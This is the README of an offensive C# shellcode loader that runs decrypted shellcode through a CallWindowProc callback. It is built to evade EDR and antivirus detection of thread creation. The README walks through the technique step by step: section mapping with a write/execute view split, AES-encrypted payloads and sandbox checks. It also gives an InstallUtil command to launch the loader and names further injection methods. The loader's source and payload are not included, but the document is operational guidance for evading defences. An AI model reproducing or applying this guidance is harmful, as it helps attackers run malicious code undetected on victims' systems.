# Callback-Injection Loader

InstallUtil-compatible C# loader that uses **CallWindowProc** for shellcode execution instead of `CreateThread`/`CreateRemoteThread`. Use this variant when thread creation is being flagged behaviorally by EDR/AV.

> **Important:** `CallWindowProc` executes in the **calling process** — it cannot execute code at a remote process address. This loader maps the section into the **local** process and executes the shellcode locally via callback. It does **not** inject into a remote process (unlike section-injection). For remote execution without `CreateRemoteThread`, consider APC injection (`NtQueueApcThread`) or thread hijacking.

## Difference from Section-Injection

| | Section-Injection | Callback-Injection |
|---|---|---|
| Execution primitive | `CreateRemoteThread` (remote) | `CallWindowProc` (local) |
| Target | Remote process (RuntimeBroker.exe) | Local process (self) |
| Behavioral indicator | Thread creation in remote process | None (callback invocation) |
| When to use | Default for remote injection | When any thread creation is flagged |

Both loaders share the same evasion layers: sandbox checks, AES encryption, section-based allocation, and a
write/execute view split (no RWX pages in the target).

## Build

Same as section-injection — see `../section-injection/README.md` for the full build workflow. Just use this directory's `Loader.cs` and `compile.bat`.

## Execute

```batch
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U loader.exe
```

## How callback execution works

```
1. Section created (NtCreateSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT)
2. Section mapped into local process as RW (NtMapViewOfSection)
3. Decrypted shellcode written to the RW view (Marshal.Copy)
4. RW view unmapped (section pages persist)
5. Section re-mapped as PAGE_EXECUTE_READ (executable view)
6. CallWindowProc(execView, 0, 0, 0, 0)
   └─ Invokes the shellcode address as a window procedure callback
   └─ No new thread is created (no CreateThread, no CreateRemoteThread)
7. NtUnmapViewOfSection cleans up after execution returns
```

## Limitations

- `CallWindowProc` executes in the **calling thread's context** — the shellcode runs synchronously
- This loader executes **locally** — it does not inject into a remote process
- For remote callback execution into another process, more advanced techniques are needed (APC injection via `NtQueueApcThread`, thread hijacking, `SetWindowsHookEx`, etc.)
- The shellcode must be position-independent and handle being called as a callback (it receives window procedure parameters it can ignore)

## Requirements

- Windows 10/11 (x64)
- .NET Framework 4.x
- user32.dll available (always present on Windows with a desktop session)
